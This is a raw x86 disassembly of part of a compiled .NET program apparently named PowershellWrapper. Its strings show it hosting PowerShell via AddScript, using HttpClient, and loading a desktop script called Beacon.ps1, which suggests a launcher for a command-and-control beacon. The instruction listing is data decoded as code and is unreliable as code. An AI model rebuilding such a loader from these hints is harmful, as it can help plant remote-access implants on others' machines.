  402ace:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402acf:	6d                   	ins    DWORD PTR es:[edi],dx
  402ad0:	70 61                	jo     0x402b33
  402ad2:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402ad3:	79 41                	jns    0x402b16
  402ad5:	74 74                	je     0x402b4b
  402ad7:	72 69                	jb     0x402b42
  402ad9:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402adc:	65 00 52 75          	add    BYTE PTR gs:[edx+0x75],dl
  402ae0:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402ae1:	74 69                	je     0x402b4c
  402ae3:	6d                   	ins    DWORD PTR es:[edi],dx
  402ae4:	65 43                	gs inc ebx
  402ae6:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402ae7:	6d                   	ins    DWORD PTR es:[edi],dx
  402ae8:	70 61                	jo     0x402b4b
  402aea:	74 69                	je     0x402b55
  402aec:	62 69 6c             	bound  ebp,QWORD PTR [ecx+0x6c]
  402aef:	69 74 79 41 74 74 72 	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  402af6:	69 
  402af7:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402afa:	65 00 53 79          	add    BYTE PTR gs:[ebx+0x79],dl
  402afe:	73 74                	jae    0x402b74
  402b00:	65 6d                	gs ins DWORD PTR es:[edi],dx
  402b02:	2e 52                	cs push edx
  402b04:	75 6e                	jne    0x402b74
  402b06:	74 69                	je     0x402b71
  402b08:	6d                   	ins    DWORD PTR es:[edi],dx
  402b09:	65 2e 56             	gs cs push esi
  402b0c:	65 72 73             	gs jb  0x402b82
  402b0f:	69 6f 6e 69 6e 67 00 	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  402b16:	54                   	push   esp
  402b17:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402b18:	53                   	push   ebx
  402b19:	74 72                	je     0x402b8d
  402b1b:	69 6e 67 00 67 65 74 	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  402b22:	5f                   	pop    edi
  402b23:	54                   	push   esp
  402b24:	61                   	popa   
  402b25:	73 6b                	jae    0x402b92
  402b27:	00 53 79             	add    BYTE PTR [ebx+0x79],dl
  402b2a:	73 74                	jae    0x402ba0
  402b2c:	65 6d                	gs ins DWORD PTR es:[edi],dx
  402b2e:	2e 43                	cs inc ebx
  402b30:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402b31:	6c                   	ins    BYTE PTR es:[edi],dx
  402b32:	6c                   	ins    BYTE PTR es:[edi],dx
  402b33:	65 63 74 69 6f       	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402b38:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402b39:	73 2e                	jae    0x402b69
  402b3b:	4f                   	dec    edi
  402b3c:	62 6a 65             	bound  ebp,QWORD PTR [edx+0x65]
  402b3f:	63 74 4d 6f          	arpl   WORD PTR [ebp+ecx*2+0x6f],si
  402b43:	64 65 6c             	fs gs ins BYTE PTR es:[edi],dx
  402b46:	00 50 6f             	add    BYTE PTR [eax+0x6f],dl
  402b49:	77 65                	ja     0x402bb0
  402b4b:	72 73                	jb     0x402bc0
  402b4d:	68 65 6c 6c 57       	push   0x576c6c65
  402b52:	72 61                	jb     0x402bb5
  402b54:	70 70                	jo     0x402bc6
  402b56:	65 72 2e             	gs jb  0x402b87
  402b59:	64 6c                	fs ins BYTE PTR es:[edi],dx
  402b5b:	6c                   	ins    BYTE PTR es:[edi],dx
  402b5c:	00 50 6f             	add    BYTE PTR [eax+0x6f],dl
  402b5f:	77 65                	ja     0x402bc6
  402b61:	72 53                	jb     0x402bb6
  402b63:	68 65 6c 6c 00       	push   0x6c6c65
  402b68:	50                   	push   eax
  402b69:	72 6f                	jb     0x402bda
  402b6b:	67 72 61             	addr16 jb 0x402bcf
  402b6e:	6d                   	ins    DWORD PTR es:[edi],dx
  402b6f:	00 53 79             	add    BYTE PTR [ebx+0x79],dl
  402b72:	73 74                	jae    0x402be8
  402b74:	65 6d                	gs ins DWORD PTR es:[edi],dx
  402b76:	00 4d 61             	add    BYTE PTR [ebp+0x61],cl
  402b79:	69 6e 00 53 79 73 74 	imul   ebp,DWORD PTR [esi+0x0],0x74737953
  402b80:	65 6d                	gs ins DWORD PTR es:[edi],dx
  402b82:	2e 4d                	cs dec ebp
  402b84:	61                   	popa   
  402b85:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402b86:	61                   	popa   
  402b87:	67 65 6d             	gs ins DWORD PTR es:[di],dx
  402b8a:	65 6e                	outs   dx,BYTE PTR gs:[esi]
  402b8c:	74 2e                	je     0x402bbc
  402b8e:	41                   	inc    ecx
  402b8f:	75 74                	jne    0x402c05
  402b91:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402b92:	6d                   	ins    DWORD PTR es:[edi],dx
  402b93:	61                   	popa   
  402b94:	74 69                	je     0x402bff
  402b96:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402b97:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402b98:	00 53 79             	add    BYTE PTR [ebx+0x79],dl
  402b9b:	73 74                	jae    0x402c11
  402b9d:	65 6d                	gs ins DWORD PTR es:[edi],dx
  402b9f:	2e 52                	cs push edx
  402ba1:	65 66 6c             	gs data16 ins BYTE PTR es:[edi],dx
  402ba4:	65 63 74 69 6f       	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402ba9:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402baa:	00 53 65             	add    BYTE PTR [ebx+0x65],dl
  402bad:	74 45                	je     0x402bf4
  402baf:	78 63                	js     0x402c14
  402bb1:	65 70 74             	gs jo  0x402c28
  402bb4:	69 6f 6e 00 53 79 73 	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  402bbb:	74 65                	je     0x402c22
  402bbd:	6d                   	ins    DWORD PTR es:[edi],dx
  402bbe:	2e 4e                	cs dec esi
  402bc0:	65 74 2e             	gs je  0x402bf1
  402bc3:	48                   	dec    eax
  402bc4:	74 74                	je     0x402c3a
  402bc6:	70 00                	jo     0x402bc8
  402bc8:	41                   	inc    ecx
  402bc9:	73 79                	jae    0x402c44
  402bcb:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402bcc:	63 54 61 73          	arpl   WORD PTR [ecx+eiz*2+0x73],dx
  402bd0:	6b 4d 65 74          	imul   ecx,DWORD PTR [ebp+0x65],0x74
  402bd4:	68 6f 64 42 75       	push   0x7542646f
  402bd9:	69 6c 64 65 72 00 3c 	imul   ebp,DWORD PTR [esp+eiz*2+0x65],0x3e3c0072
  402be0:	3e 
  402be1:	74 5f                	je     0x402c42
  402be3:	5f                   	pop    edi
  402be4:	62 75 69             	bound  esi,QWORD PTR [ebp+0x69]
  402be7:	6c                   	ins    BYTE PTR es:[edi],dx
  402be8:	64 65 72 00          	fs gs jb 0x402bec
  402bec:	50                   	push   eax
  402bed:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402bee:	77 65                	ja     0x402c55
  402bf0:	72 73                	jb     0x402c65
  402bf2:	68 65 6c 6c 57       	push   0x576c6c65
  402bf7:	72 61                	jb     0x402c5a
  402bf9:	70 70                	jo     0x402c6b
  402bfb:	65 72 00             	gs jb  0x402bfe
  402bfe:	54                   	push   esp
  402bff:	61                   	popa   
  402c00:	73 6b                	jae    0x402c6d
  402c02:	41                   	inc    ecx
  402c03:	77 61                	ja     0x402c66
  402c05:	69 74 65 72 00 47 65 	imul   esi,DWORD PTR [ebp+eiz*2+0x72],0x74654700
  402c0c:	74 
  402c0d:	41                   	inc    ecx
  402c0e:	77 61                	ja     0x402c71
  402c10:	69 74 65 72 00 49 45 	imul   esi,DWORD PTR [ebp+eiz*2+0x72],0x6e454900
  402c17:	6e 
  402c18:	75 6d                	jne    0x402c87
  402c1a:	65 72 61             	gs jb  0x402c7e
  402c1d:	74 6f                	je     0x402c8e
  402c1f:	72 00                	jb     0x402c21
  402c21:	47                   	inc    edi
  402c22:	65 74 45             	gs je  0x402c6a
  402c25:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402c26:	75 6d                	jne    0x402c95
  402c28:	65 72 61             	gs jb  0x402c8c
  402c2b:	74 6f                	je     0x402c9c
  402c2d:	72 00                	jb     0x402c2f
  402c2f:	2e 63 74 6f 72       	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  402c34:	00 53 79             	add    BYTE PTR [ebx+0x79],dl
  402c37:	73 74                	jae    0x402cad
  402c39:	65 6d                	gs ins DWORD PTR es:[edi],dx
  402c3b:	2e 44                	cs inc esp
  402c3d:	69 61 67 6e 6f 73 74 	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  402c44:	69 63 73 00 53 79 73 	imul   esp,DWORD PTR [ebx+0x73],0x73795300
  402c4b:	74 65                	je     0x402cb2
  402c4d:	6d                   	ins    DWORD PTR es:[edi],dx
  402c4e:	2e 52                	cs push edx
  402c50:	75 6e                	jne    0x402cc0
  402c52:	74 69                	je     0x402cbd
  402c54:	6d                   	ins    DWORD PTR es:[edi],dx
  402c55:	65 2e 43             	gs cs inc ebx
  402c58:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402c59:	6d                   	ins    DWORD PTR es:[edi],dx
  402c5a:	70 69                	jo     0x402cc5
  402c5c:	6c                   	ins    BYTE PTR es:[edi],dx
  402c5d:	65 72 53             	gs jb  0x402cb3
  402c60:	65 72 76             	gs jb  0x402cd9
  402c63:	69 63 65 73 00 44 65 	imul   esp,DWORD PTR [ebx+0x65],0x65440073
  402c6a:	62 75 67             	bound  esi,QWORD PTR [ebp+0x67]
  402c6d:	67 69 6e 67 4d 6f 64 	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  402c74:	65 
  402c75:	73 00                	jae    0x402c77
  402c77:	61                   	popa   
  402c78:	72 67                	jb     0x402ce1
  402c7a:	73 00                	jae    0x402c7c
  402c7c:	53                   	push   ebx
  402c7d:	79 73                	jns    0x402cf2
  402c7f:	74 65                	je     0x402ce6
  402c81:	6d                   	ins    DWORD PTR es:[edi],dx
  402c82:	2e 54                	cs push esp
  402c84:	68 72 65 61 64       	push   0x64616572
  402c89:	69 6e 67 2e 54 61 73 	imul   ebp,DWORD PTR [esi+0x67],0x7361542e
  402c90:	6b 73 00 53          	imul   esi,DWORD PTR [ebx+0x0],0x53
  402c94:	79 73                	jns    0x402d09
  402c96:	74 65                	je     0x402cfd
  402c98:	6d                   	ins    DWORD PTR es:[edi],dx
  402c99:	2e 43                	cs inc ebx
  402c9b:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402c9c:	6c                   	ins    BYTE PTR es:[edi],dx
  402c9d:	6c                   	ins    BYTE PTR es:[edi],dx
  402c9e:	65 63 74 69 6f       	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402ca3:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402ca4:	73 00                	jae    0x402ca6
  402ca6:	50                   	push   eax
  402ca7:	53                   	push   ebx
  402ca8:	4f                   	dec    edi
  402ca9:	62 6a 65             	bound  ebp,QWORD PTR [edx+0x65]
  402cac:	63 74 00 47          	arpl   WORD PTR [eax+eax*1+0x47],si
  402cb0:	65 74 52             	gs je  0x402d05
  402cb3:	65 73 75             	gs jae 0x402d2b
  402cb6:	6c                   	ins    BYTE PTR es:[edi],dx
  402cb7:	74 00                	je     0x402cb9
  402cb9:	53                   	push   ebx
  402cba:	65 74 52             	gs je  0x402d0f
  402cbd:	65 73 75             	gs jae 0x402d35
  402cc0:	6c                   	ins    BYTE PTR es:[edi],dx
  402cc1:	74 00                	je     0x402cc3
  402cc3:	48                   	dec    eax
  402cc4:	74 74                	je     0x402d3a
  402cc6:	70 43                	jo     0x402d0b
  402cc8:	6c                   	ins    BYTE PTR es:[edi],dx
  402cc9:	69 65 6e 74 00 67 65 	imul   esp,DWORD PTR [ebp+0x6e],0x65670074
  402cd0:	74 5f                	je     0x402d31
  402cd2:	43                   	inc    ebx
  402cd3:	75 72                	jne    0x402d47
  402cd5:	72 65                	jb     0x402d3c
  402cd7:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402cd8:	74 00                	je     0x402cda
  402cda:	41                   	inc    ecx
  402cdb:	64 64 53             	fs fs push ebx
  402cde:	63 72 69             	arpl   WORD PTR [edx+0x69],si
  402ce1:	70 74                	jo     0x402d57
  402ce3:	00 53 74             	add    BYTE PTR [ebx+0x74],dl
  402ce6:	61                   	popa   
  402ce7:	72 74                	jb     0x402d5d
  402ce9:	00 4d 6f             	add    BYTE PTR [ebp+0x6f],cl
  402cec:	76 65                	jbe    0x402d53
  402cee:	4e                   	dec    esi
  402cef:	65 78 74             	gs js  0x402d66
  402cf2:	00 00                	add    BYTE PTR [eax],al
  402cf4:	00 4b 43             	add    BYTE PTR [ebx+0x43],cl
  402cf7:	00 3a                	add    BYTE PTR [edx],bh
  402cf9:	00 5c 00 55          	add    BYTE PTR [eax+eax*1+0x55],bl
  402cfd:	00 73 00             	add    BYTE PTR [ebx+0x0],dh
  402d00:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  402d04:	73 00                	jae    0x402d06
  402d06:	5c                   	pop    esp
  402d07:	00 4d 00             	add    BYTE PTR [ebp+0x0],cl
  402d0a:	79 00                	jns    0x402d0c
  402d0c:	20 00                	and    BYTE PTR [eax],al
  402d0e:	4c                   	dec    esp
  402d0f:	00 61 00             	add    BYTE PTR [ecx+0x0],ah
  402d12:	70 00                	jo     0x402d14
  402d14:	74 00                	je     0x402d16
  402d16:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402d17:	00 70 00             	add    BYTE PTR [eax+0x0],dh
  402d1a:	5c                   	pop    esp
  402d1b:	00 44 00 65          	add    BYTE PTR [eax+eax*1+0x65],al
  402d1f:	00 73 00             	add    BYTE PTR [ebx+0x0],dh
  402d22:	6b 00 74             	imul   eax,DWORD PTR [eax],0x74
  402d25:	00 6f 00             	add    BYTE PTR [edi+0x0],ch
  402d28:	70 00                	jo     0x402d2a
  402d2a:	5c                   	pop    esp
  402d2b:	00 42 00             	add    BYTE PTR [edx+0x0],al
  402d2e:	65 00 61 00          	add    BYTE PTR gs:[ecx+0x0],ah
  402d32:	63 00                	arpl   WORD PTR [eax],ax
  402d34:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402d35:	00 6e 00             	add    BYTE PTR [esi+0x0],ch
  402d38:	2e 00 70 00          	add    BYTE PTR cs:[eax+0x0],dh
  402d3c:	73 00                	jae    0x402d3e
  402d3e:	31 00                	xor    DWORD PTR [eax],eax
  402d40:	00 00                	add    BYTE PTR [eax],al
  402d42:	00 00                	add    BYTE PTR [eax],al
  402d44:	7b 23                	jnp    0x402d69
  402d46:	30 2a                	xor    BYTE PTR [edx],ch
  402d48:	d9 fe                	fsin   
  402d4a:	f6 43 ac b7          	test   BYTE PTR [ebx-0x54],0xb7
  402d4e:	20 90 bb ae d0 2e    	and    BYTE PTR [eax+0x2ed0aebb],dl
  402d54:	00 04 20             	add    BYTE PTR [eax+eiz*1],al
  402d57:	01 01                	add    DWORD PTR [ecx],eax
  402d59:	08 03                	or     BYTE PTR [ebx],al
  402d5b:	20 00                	and    BYTE PTR [eax],al
  402d5d:	01 05 20 01 01 11    	add    DWORD PTR ds:0x11010120,eax
  402d63:	11 04 20             	adc    DWORD PTR [eax+eiz*1],eax
  402d66:	01 01                	add    DWORD PTR [ecx],eax
  402d68:	0e                   	push   cs
  402d69:	04 20                	add    al,0x20
  402d6b:	01 01                	add    DWORD PTR [ecx],eax
  402d6d:	05 05 20 01 01       	add    eax,0x1012005
  402d72:	12 3d 05 20 01 01    	adc    bh,BYTE PTR ds:0x1012005
  402d78:	12 59 05             	adc    bl,BYTE PTR [ecx+0x5]
  402d7b:	20 01                	and    BYTE PTR [ecx],al
  402d7d:	01 1d 05 04 07 01    	add    DWORD PTR ds:0x1070405,ebx
  402d83:	12 0c 04             	adc    cl,BYTE PTR [esp+eax*1]
  402d86:	00 00                	add    BYTE PTR [eax],al
  402d88:	11 65 07             	adc    DWORD PTR [ebp+0x7],esp
  402d8b:	30 01                	xor    BYTE PTR [ecx],al
  402d8d:	01 01                	add    DWORD PTR [ecx],eax
  402d8f:	10 1e                	adc    BYTE PTR [esi],bl
  402d91:	00 04 0a             	add    BYTE PTR [edx+ecx*1],al
  402d94:	01 12                	add    DWORD PTR [edx],edx
  402d96:	0c 04                	or     al,0x4
  402d98:	20 00                	and    BYTE PTR [eax],al
  402d9a:	12 49 04             	adc    cl,BYTE PTR [ecx+0x4]
  402d9d:	07                   	pop    es
  402d9e:	01 11                	add    DWORD PTR [ecx],edx
  402da0:	51                   	push   ecx
  402da1:	04 20                	add    al,0x20
  402da3:	00 11                	add    BYTE PTR [ecx],dl
  402da5:	51                   	push   ecx
  402da6:	0c 07                	or     al,0x7
  402da8:	04 08                	add    al,0x8
  402daa:	15 11 5d 01 0e       	adc    eax,0xe015d11
  402daf:	12 0c 12             	adc    cl,BYTE PTR [edx+edx*1]
  402db2:	61                   	popa   
  402db3:	09 20                	or     DWORD PTR [eax],esp
  402db5:	01 15 12 80 81 01    	add    DWORD PTR ds:0x1818012,edx
  402dbb:	0e                   	push   cs
  402dbc:	0e                   	push   cs
  402dbd:	06                   	push   es
  402dbe:	15 12 80 81 01       	adc    eax,0x1818012
  402dc3:	0e                   	push   cs
  402dc4:	08 20                	or     BYTE PTR [eax],ah
  402dc6:	00 15 11 5d 01 13    	add    BYTE PTR ds:0x13015d11,dl
  402dcc:	00 05 15 11 5d 01    	add    BYTE PTR ds:0x15d1115,al
  402dd2:	0e                   	push   cs
  402dd3:	03 20                	add    esp,DWORD PTR [eax]
  402dd5:	00 02                	add    BYTE PTR [edx],al
  402dd7:	0a 30                	or     dh,BYTE PTR [eax]
  402dd9:	02 02                	add    al,BYTE PTR [edx]
  402ddb:	01 10                	add    DWORD PTR [eax],edx
  402ddd:	1e                   	push   ds
  402dde:	00 10                	add    BYTE PTR [eax],dl
  402de0:	1e                   	push   ds
  402de1:	01 09                	add    DWORD PTR [ecx],ecx
  402de3:	0a 02                	or     al,BYTE PTR [edx]
  402de5:	15 11 5d 01 0e       	adc    eax,0xe015d11
  402dea:	12 0c 04             	adc    cl,BYTE PTR [esp+eax*1]
  402ded:	20 00                	and    BYTE PTR [eax],al
  402def:	13 00                	adc    eax,DWORD PTR [eax]
  402df1:	04 00                	add    al,0x0
  402df3:	00 12                	add    BYTE PTR [edx],dl
  402df5:	6d                   	ins    DWORD PTR es:[edi],dx
  402df6:	05 20 01 12 6d       	add    eax,0x6d120120
  402dfb:	0e                   	push   cs
  402dfc:	08 20                	or     BYTE PTR [eax],ah
  402dfe:	00 15 12 71 01 12    	add    BYTE PTR ds:0x12017112,dl
  402e04:	75 06                	jne    0x402e0c
  402e06:	15 12 71 01 12       	adc    eax,0x12017112
  402e0b:	75 08                	jne    0x402e15
  402e0d:	20 00                	and    BYTE PTR [eax],al
  402e0f:	15 12 79 01 13       	adc    eax,0x13017912
  402e14:	00 06                	add    BYTE PTR [esi],al
  402e16:	15 12 79 01 12       	adc    eax,0x12017912
  402e1b:	75 03                	jne    0x402e20
  402e1d:	20 00                	and    BYTE PTR [eax],al
  402e1f:	0e                   	push   cs
  402e20:	04 00                	add    al,0x0
  402e22:	01 01                	add    DWORD PTR [ecx],eax
  402e24:	0e                   	push   cs
  402e25:	05 20 01 01 12       	add    eax,0x12010120
  402e2a:	61                   	popa   
  402e2b:	08 b0 3f 5f 7f 11    	or     BYTE PTR [eax+0x117f5f3f],dh
  402e31:	d5 0a                	aad    0xa
  402e33:	3a 08                	cmp    cl,BYTE PTR [eax]
  402e35:	31 bf 38 56 ad 36    	xor    DWORD PTR [edi+0x36ad5638],edi
  402e3b:	4e                   	dec    esi
  402e3c:	35 02 06 08 03       	xor    eax,0x3080602
  402e41:	06                   	push   es
  402e42:	11 65 03             	adc    DWORD PTR [ebp+0x3],esp
  402e45:	06                   	push   es
  402e46:	1d 0e 02 06 0e       	sbb    eax,0xe06020e
  402e4b:	03 06                	add    eax,DWORD PTR [esi]
  402e4d:	12 69 03             	adc    ch,BYTE PTR [ecx+0x3]
  402e50:	06                   	push   es
  402e51:	12 6d 07             	adc    ch,BYTE PTR [ebp+0x7]
  402e54:	06                   	push   es
  402e55:	15 12 71 01 12       	adc    eax,0x12017112
  402e5a:	75 07                	jne    0x402e63
  402e5c:	06                   	push   es
  402e5d:	15 12 79 01 12       	adc    eax,0x12017912
  402e62:	75 03                	jne    0x402e67
  402e64:	06                   	push   es
  402e65:	12 75 06             	adc    dh,BYTE PTR [ebp+0x6]
  402e68:	06                   	push   es
  402e69:	15 11 5d 01 0e       	adc    eax,0xe015d11
  402e6e:	06                   	push   es
  402e6f:	00 01                	add    BYTE PTR [ecx],al
  402e71:	12 49 1d             	adc    cl,BYTE PTR [ecx+0x1d]
  402e74:	0e                   	push   cs
  402e75:	05 00 01 01 1d       	add    eax,0x1d010100
  402e7a:	0e                   	push   cs
  402e7b:	08 01                	or     BYTE PTR [ecx],al
  402e7d:	00 08                	add    BYTE PTR [eax],cl
  402e7f:	00 00                	add    BYTE PTR [eax],al
  402e81:	00 00                	add    BYTE PTR [eax],al
  402e83:	00 1e                	add    BYTE PTR [esi],bl
  402e85:	01 00                	add    DWORD PTR [eax],eax
  402e87:	01 00                	add    DWORD PTR [eax],eax
  402e89:	54                   	push   esp
  402e8a:	02 16                	add    dl,BYTE PTR [esi]
  402e8c:	57                   	push   edi
  402e8d:	72 61                	jb     0x402ef0
  402e8f:	70 4e                	jo     0x402edf
  402e91:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402e92:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402e93:	45                   	inc    ebp
  402e94:	78 63                	js     0x402ef9
  402e96:	65 70 74             	gs jo  0x402f0d
  402e99:	69 6f 6e 54 68 72 6f 	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  402ea0:	77 73                	ja     0x402f15
  402ea2:	01 08                	add    DWORD PTR [eax],ecx
  402ea4:	01 00                	add    DWORD PTR [eax],eax
  402ea6:	07                   	pop    es
  402ea7:	01 00                	add    DWORD PTR [eax],eax
  402ea9:	00 00                	add    BYTE PTR [eax],al
  402eab:	00 3d 01 00 18 2e    	add    BYTE PTR ds:0x2e180001,bh
  402eb1:	4e                   	dec    esi
  402eb2:	45                   	inc    ebp
  402eb3:	54                   	push   esp
  402eb4:	43                   	inc    ebx
  402eb5:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402eb6:	72 65                	jb     0x402f1d
  402eb8:	41                   	inc    ecx
  402eb9:	70 70                	jo     0x402f2b
  402ebb:	2c 56                	sub    al,0x56
  402ebd:	65 72 73             	gs jb  0x402f33
  402ec0:	69 6f 6e 3d 76 39 2e 	imul   ebp,DWORD PTR [edi+0x6e],0x2e39763d
  402ec7:	30 01                	xor    BYTE PTR [ecx],al
  402ec9:	00 54 0e 14          	add    BYTE PTR [esi+ecx*1+0x14],dl
  402ecd:	46                   	inc    esi
  402ece:	72 61                	jb     0x402f31
  402ed0:	6d                   	ins    DWORD PTR es:[edi],dx
  402ed1:	65 77 6f             	gs ja  0x402f43
  402ed4:	72 6b                	jb     0x402f41
  402ed6:	44                   	inc    esp
  402ed7:	69 73 70 6c 61 79 4e 	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  402ede:	61                   	popa   
  402edf:	6d                   	ins    DWORD PTR es:[edi],dx
  402ee0:	65 08 2e             	or     BYTE PTR gs:[esi],ch
  402ee3:	4e                   	dec    esi
  402ee4:	45                   	inc    ebp
  402ee5:	54                   	push   esp
  402ee6:	20 39                	and    BYTE PTR [ecx],bh
  402ee8:	2e 30 16             	xor    BYTE PTR cs:[esi],dl
  402eeb:	01 00                	add    DWORD PTR [eax],eax
  402eed:	11 50 6f             	adc    DWORD PTR [eax+0x6f],edx
  402ef0:	77 65                	ja     0x402f57
  402ef2:	72 73                	jb     0x402f67
  402ef4:	68 65 6c 6c 57       	push   0x576c6c65
  402ef9:	72 61                	jb     0x402f5c
  402efb:	70 70                	jo     0x402f6d
  402efd:	65 72 00             	gs jb  0x402f00
  402f00:	00 0a                	add    BYTE PTR [edx],cl
  402f02:	01 00                	add    DWORD PTR [eax],eax
  402f04:	05 44 65 62 75       	add    eax,0x75626544
  402f09:	67 00 00             	add    BYTE PTR [bx+si],al
  402f0c:	0c 01                	or     al,0x1
  402f0e:	00 07                	add    BYTE PTR [edi],al
  402f10:	31 2e                	xor    DWORD PTR [esi],ebp
  402f12:	30 2e                	xor    BYTE PTR [esi],ch
  402f14:	30 2e                	xor    BYTE PTR [esi],ch
  402f16:	30 00                	xor    BYTE PTR [eax],al
  402f18:	00 0a                	add    BYTE PTR [edx],cl
  402f1a:	01 00                	add    DWORD PTR [eax],eax
  402f1c:	05 31 2e 30 2e       	add    eax,0x2e302e31
  402f21:	30 00                	xor    BYTE PTR [eax],al
  402f23:	00 05 01 00 01 00    	add    BYTE PTR ds:0x10001,al
  402f29:	00 17                	add    BYTE PTR [edi],dl
  402f2b:	01 00                	add    DWORD PTR [eax],eax
  402f2d:	12 50 72             	adc    dl,BYTE PTR [eax+0x72]
  402f30:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402f31:	67 72 61             	addr16 jb 0x402f95
  402f34:	6d                   	ins    DWORD PTR es:[edi],dx
  402f35:	2b 3c 4d 61 69 6e 3e 	sub    edi,DWORD PTR [ecx*2+0x3e6e6961]
  402f3c:	64 5f                	fs pop edi
  402f3e:	5f                   	pop    edi
  402f3f:	30 00                	xor    BYTE PTR [eax],al
  402f41:	00 04 01             	add    BYTE PTR [ecx+eax*1],al
  402f44:	00 00                	add    BYTE PTR [eax],al
  402f46:	00 0a                	add    BYTE PTR [edx],cl
  402f48:	01 00                	add    DWORD PTR [eax],eax
  402f4a:	02 00                	add    al,BYTE PTR [eax]
  402f4c:	00 00                	add    BYTE PTR [eax],al
  402f4e:	00 01                	add    BYTE PTR [ecx],al
  402f50:	00 00                	add    BYTE PTR [eax],al
  402f52:	08 01                	or     BYTE PTR [ecx],al
  402f54:	00 0b                	add    BYTE PTR [ebx],cl
	...
  402f5e:	00 00                	add    BYTE PTR [eax],al
  402f60:	00 4d 5a             	add    BYTE PTR [ebp+0x5a],cl
  402f63:	ba 00 01 4d 50       	mov    edx,0x504d0100
  402f68:	02 00                	add    al,BYTE PTR [eax]
  402f6a:	00 00                	add    BYTE PTR [eax],al
  402f6c:	6c                   	ins    BYTE PTR es:[edi],dx
  402f6d:	00 00                	add    BYTE PTR [eax],al
  402f6f:	00 b0 2f 00 00 b0    	add    BYTE PTR [eax-0x4fffffd1],dh
  402f75:	11 00                	adc    DWORD PTR [eax],eax
	...
  402f7f:	00 01                	add    BYTE PTR [ecx],al
  402f81:	00 00                	add    BYTE PTR [eax],al
  402f83:	00 13                	add    BYTE PTR [ebx],dl
  402f85:	00 00                	add    BYTE PTR [eax],al
  402f87:	00 27                	add    BYTE PTR [edi],ah
  402f89:	00 00                	add    BYTE PTR [eax],al
  402f8b:	00 1c 30             	add    BYTE PTR [eax+esi*1],bl
  402f8e:	00 00                	add    BYTE PTR [eax],al
  402f90:	1c 12                	sbb    al,0x12
	...
  402f9e:	00 00                	add    BYTE PTR [eax],al
  402fa0:	10 00                	adc    BYTE PTR [eax],al
	...
  402fae:	00 00                	add    BYTE PTR [eax],al
  402fb0:	52                   	push   edx
  402fb1:	53                   	push   ebx
  402fb2:	44                   	inc    esp
  402fb3:	53                   	push   ebx
  402fb4:	1e                   	push   ds
  402fb5:	9b                   	fwait
  402fb6:	ab                   	stos   DWORD PTR es:[edi],eax
  402fb7:	4c                   	dec    esp
  402fb8:	c0 e0 53             	shl    al,0x53
  402fbb:	47                   	inc    edi
  402fbc:	ac                   	lods   al,BYTE PTR ds:[esi]
  402fbd:	2b 12                	sub    edx,DWORD PTR [edx]
  402fbf:	13 cf                	adc    ecx,edi
  402fc1:	c8 87 46 01          	enter  0x4687,0x1
  402fc5:	00 00                	add    BYTE PTR [eax],al
  402fc7:	00 43 3a             	add    BYTE PTR [ebx+0x3a],al
  402fca:	5c                   	pop    esp
  402fcb:	55                   	push   ebp
  402fcc:	73 65                	jae    0x403033
  402fce:	72 73                	jb     0x403043
  402fd0:	5c                   	pop    esp
  402fd1:	4d                   	dec    ebp
  402fd2:	79 20                	jns    0x402ff4
  402fd4:	4c                   	dec    esp
  402fd5:	61                   	popa   
  402fd6:	70 74                	jo     0x40304c
  402fd8:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402fd9:	70 5c                	jo     0x403037
  402fdb:	44                   	inc    esp
  402fdc:	65 73 6b             	gs jae 0x40304a
  402fdf:	74 6f                	je     0x403050
  402fe1:	70 5c                	jo     0x40303f
  402fe3:	50                   	push   eax
  402fe4:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402fe5:	77 65                	ja     0x40304c
  402fe7:	72 73                	jb     0x40305c
  402fe9:	68 65 6c 6c 57       	push   0x576c6c65
  402fee:	72 61                	jb     0x403051
  402ff0:	70 70                	jo     0x403062
  402ff2:	65 72 5c             	gs jb  0x403051
  402ff5:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402ff6:	62 6a 5c             	bound  ebp,QWORD PTR [edx+0x5c]
  402ff9:	44                   	inc    esp
  402ffa:	65 62 75 67          	bound  esi,QWORD PTR gs:[ebp+0x67]
  402ffe:	5c                   	pop    esp
  402fff:	6e                   	outs   dx,BYTE PTR ds:[esi]
  403000:	65 74 39             	gs je  0x40303c
  403003:	2e 30 5c 50 6f       	xor    BYTE PTR cs:[eax+edx*2+0x6f],bl
  403008:	77 65                	ja     0x40306f
  40300a:	72 73                	jb     0x40307f
